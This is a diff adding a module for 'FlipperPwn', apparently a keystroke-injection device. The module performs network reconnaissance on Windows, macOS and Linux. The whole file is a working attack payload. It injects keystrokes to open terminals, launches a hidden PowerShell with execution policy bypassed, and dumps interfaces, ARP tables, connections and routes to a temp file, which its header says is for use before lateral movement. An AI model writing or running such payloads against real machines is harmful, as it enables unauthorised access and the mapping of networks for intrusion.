@@ -1,0 +1,43 @@
+# FlipperPwn Module: Network Reconnaissance
+# Captures interface config, ARP cache, open connections, and routing table.
+# Useful for mapping the local network segment before lateral movement.
+
+NAME network_enum
+DESCRIPTION Enumerate network interfaces, ARP table, active connections, and routing table
+CATEGORY recon
+PLATFORMS WIN,MAC,LINUX
+
+# No options required
+
+PLATFORM WIN
+  # Open hidden PowerShell via Run dialog
+  DELAY 500
+  GUI r
+  DELAY 300
+  STRING powershell -w h -nop -ep bypass
+  ENTER
+  DELAY 1000
+  # Capture all four data sources into a single temp file
+  STRING $o="$env:TEMP\net_enum.txt"; "=== IPCONFIG /ALL ===" | Out-File $o; ipconfig /all | Out-File $o -Append; "=== ARP -A ===" | Out-File $o -Append; arp -a | Out-File $o -Append; "=== NETSTAT -AN ===" | Out-File $o -Append; netstat -an | Out-File $o -Append; "=== ROUTE PRINT ===" | Out-File $o -Append; route print | Out-File $o -Append; Start-Process notepad $o
+  ENTER
+
+PLATFORM MAC
+  # Open Terminal via Spotlight
+  DELAY 500
+  GUI SPACE
+  DELAY 400
+  STRING Terminal
+  ENTER
+  DELAY 1200
+  # macOS equivalents: netstat -rn for routing, netstat -an for connections
+  STRING o=/tmp/net_enum.txt; echo "=== IFCONFIG ===" > $o; ifconfig >> $o; echo "=== ARP ===" >> $o; arp -a >> $o; echo "=== NETSTAT -AN ===" >> $o; netstat -an >> $o; echo "=== ROUTING TABLE ===" >> $o; netstat -rn >> $o; open -e $o
+  ENTER
+
+PLATFORM LINUX
+  # Open terminal emulator
+  DELAY 500
+  CTRL ALT t
+  DELAY 1000
+  # iproute2 commands preferred; ss replaces netstat on modern distros
+  STRING o=/tmp/net_enum.txt; echo "=== IP ADDR ===" > $o; ip a >> $o; echo "=== ARP / NEIGHBORS ===" >> $o; ip neigh >> $o; echo "=== SS -TULPN ===" >> $o; ss -tulpn >> $o; echo "=== IP ROUTE ===" >> $o; ip route >> $o; xdg-open $o 2>/dev/null || cat $o
+  ENTER
